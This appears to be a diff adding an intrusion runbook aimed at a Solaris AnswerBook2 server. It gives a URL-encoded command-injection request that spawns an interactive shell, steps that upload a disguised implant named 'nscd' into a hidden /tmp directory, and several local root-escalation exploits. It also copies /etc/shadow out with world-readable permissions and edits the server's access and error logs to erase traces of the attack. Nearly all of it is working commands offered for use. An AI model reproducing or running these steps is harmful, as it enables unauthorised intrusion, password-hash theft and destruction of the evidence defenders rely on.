@@ -1,0 +1,116 @@
+#For now, attack from a Linux box. Sun's telnet client seems to be
+#strlen impaired. Also, Answerbook and netcat don't get along for some reason.
+
+#The following substitutions are for the URL:
+:%s/$/%0A/g
+:%s/&/%26/g
+:%s/ /%20/g
+:%s/;/%3B/g
+:%s/\$/%24/g
+
+#Do the substitutions via the shell, simply copy and paste if vi impaired
+cat grabit | sed 's/$/%0A/g;s/&/%26/g;s/;/%3B/g;s/ /%20/g;s/+/%2B/g;s/$s/ABC/g;s/\"/\\"/g;s/GET%20/GET /g;s/\\ABC/$s/g;s/%20\\"\\%0A/%20"\\%0A/g;s/^\\"%20/\"%20/g' > seed1
+
+vi seed1
+Join lines, make sure there are no spaces
+delete the last %0a
+
+# check for open ports
+telnet TARGETIP 8080 
+telnet TARGETIP 8081
+
+# The following URL is seed1
+# Let's do it
+telnet TARGETIP 8888
+
+GET /ab2/@LegacyPageView?ps=`echo%20"\%0A(/bin/ksh<<\%2B%0As=63%0Awhile%20[%20ABC%20-gt%208%20]%0Ado%0A[[%20-S%20/dev/fd/ABC%20]]%20%26%26%20break%0A((s=ABC-1))%0Adone%0A[%20ABC%20-gt%208%20]%20%26%26%20exec%20sh%20-i%20</dev/fd/ABC%20>%20/dev/fd/ABC%202>%261%20%26%0A%2B%0A)2>/dev/null%26%0A"%20|%20sed%20's/ABC/$s/g'%20|%20sh` HTTP/1.0
+
+
+#AB starts two shells which sometimes confuses the output, so 
+#delete the last one.
+exit;: 
+
+#not usually needed
+#toggle crlf
+
+#needed
+toggle outbinary
+
+mkdir /tmp/.X11R6; cd /tmp/.X11R6; pwd
+cat > a.uu <<"EOF"
+# more nscd.uu
+EOF
+
+uudecode a.uu && uncompress nscd.Z && rm a.uu 
+chmod +x nscd;ls -la
+PATH=/tmp/.X11R6 P=8080 nscd
+
+../bin/nosy3_client.rh62 -p 8080 TARGETIP
+ps -ef|grep sh
+
+#elevation to root using a local
+#won't work if X is blocked
+ls -la /usr/dt/bin/dtprintinfo
+3
+xp
+xp_dtprintinfo
+chmod +x xp
+PATH=/tmp/.X11R6:/bin:/usr/bin:/sbin:/usr/sbin:/etc:/usr/etc:/usr/ucb
+
+echo "PATH=/tmp/.X11R6 P=8081 nscd" | ./xp
+../bin/nosy3_client.rh62 -p 8081 TARGETIP
+
+#elevation to root using another local
+#won't work if X is blocked
+ls -la /usr/openwin/bin/kcms_calibrate
+3
+xp2
+libXmexploit2.6
+chmod +x xp2
+#xhost +
+echo "PATH=/tmp/.X11R6 P=8081 nscd" | ./xp2 LOCALIP:0
+
+#wsmoothy
+mkdir -p /tmp/1291aaab
+cd /tmp/1291aaab
+cp ~/efs/{WS|PS}/efs . 
+rm -f fd2
+echo "PATH=/tmp/.X11R6 P=8081 nscd" | ./efs
+
+ls -lart /var/log/ab2/logs
+tail /var/log/ab2/logs/errors-8888.log
+
+tail -20 /var/log/ab2/logs/access-8888.log
+wc /var/log/ab2/logs/access-8888.log
+cp /var/log/ab2/logs/access-8888.log .
+head -$wc-15 access-8888.log > out
+tail -20 out
+cat out > /var/log/ab2/logs/access-8888.log
+tail -20 /var/log/ab2/logs/access-8888.log
+
+# clean previous OP
+egrep -v '(OLDIP|X11R6|telnet |uudecode|uncompress -f|nscd|user |binary|ingreslock|tags)' access-8888.log > out
+
+# clean the logs
+tail /var/log/ab2/logs/main-8888.log
+wc /var/log/ab2/logs/main-8888.log
+cp /var/log/ab2/logs/main-8888.log .
+head -$wc-1 main-8888.log > out2
+tail out2
+cat out2  > /var/log/ab2/logs/main-8888.log
+tail /var/log/ab2/logs/main-8888.log
+
+# elevate using BLUESPIRIT
+rpcinfo -p
+# in a nosy client
+9
+#Target IP (0 for listen): 127.0.0.1
+#Target Port: 32772
+#Local Port: 11111
+#Protocol 1 for TCP 2 for UDP: 2
+
+On the local terminal:
+./bs -i 127.0.0.1 -h sage -p 11111 -c "PATH=/tmp/.X11R6 P=8081 nscd"
+./bs -i 127.0.0.1 -h sage -p 11111 -c "cp /etc/shadow /tmp/.X11R6; chmod 777 /tmp/.X11R6/shadow" 
+
+../bin/nosy3_client.rh62 -p 8081 TARGETIP
